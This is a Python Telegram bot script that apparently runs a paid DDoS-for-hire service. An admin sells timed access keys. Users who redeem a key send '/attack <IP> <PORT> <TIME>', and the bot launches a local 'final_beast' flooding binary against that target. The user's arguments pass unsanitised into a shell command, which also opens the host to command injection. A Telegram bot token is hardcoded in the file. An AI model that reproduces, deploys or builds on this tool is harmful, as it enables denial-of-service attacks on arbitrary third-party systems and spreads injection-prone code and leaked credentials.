import telebot, subprocess, threading, os, time, datetime
from flask import Flask
from telebot import types

# --- CONFIGURATION ---
TOKEN = "8586393188:AAF-zC6xKyiaLil7pd_0tEbooy9jYBAFxqA"
ADMIN_ID = 5625622115  # Sultan ki ID
bot = telebot.TeleBot(TOKEN)
app = Flask('')

USER_DATA_FILE = "users.txt"
KEYS_FILE = "keys.txt"

@app.route('/')
def home(): return "Sultan V4 God Mode is Active!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- ACCESS LOGIC ---
def has_access(user_id):
    if user_id == ADMIN_ID: return True # Admin ke liye unlimited access
    if not os.path.exists(USER_DATA_FILE): return False
    with open(USER_DATA_FILE, "r") as f:
        for line in f:
            uid, expiry = line.strip().split("|")
            if int(uid) == user_id:
                if time.time() < float(expiry): return True
    return False

# --- COMMANDS ---

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ **Format:** `/genkey 1d` (d=day, h=hour, m=min)")
        return
    
    duration_str = args[1]
    amount = int(duration_str[:-1])
    unit = duration_str[-1]
    
    if unit == 'd': seconds = amount * 86400
    elif unit == 'h': seconds = amount * 3600
    else: seconds = amount * 60
    
    key = f"SULTAN-{os.urandom(2).hex().upper()}-{duration_str}"
    with open(KEYS_FILE, "a") as f: f.write(f"{key}|{seconds}\n")
    bot.reply_to(message, f"🔑 **KEY GENERATED**\n\nKey: `{key}`\nBande ko bhej do!")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    args = message.text.split()
    if len(args) < 2: return
    user_key = args[1]
    found, new_keys, expiry_time = False, [], 0

    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r") as f:
            for line in f:
                k, dur = line.strip().split("|")
                if k == user_key:
                    found, expiry_time = True, time.time() + float(dur)
                else: new_keys.append(line)
        
        if found:
            with open(KEYS_FILE, "w") as f: f.writelines(new_keys)
            with open(USER_DATA_FILE, "a") as f: f.write(f"{message.from_user.id}|{expiry_time}\n")
            bot.reply_to(message, "✅ **ACCESS GRANTED!**")
        else: bot.reply_to(message, "❌ Invalid Key!")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not has_access(message.from_user.id):
        bot.reply_to(message, "🚫 Pehle Key khareedo!")
        return
    
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ `/attack <IP> <PORT> <TIME>`")
        return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **SULTAN ATTACK STARTED!**\n📍 Target: `{ip}:{port}`\n⏳ Duration: `{dur}s`")
    
    # Permission fix and run
    subprocess.Popen(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 10", shell=True)

if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.polling(none_stop=True)
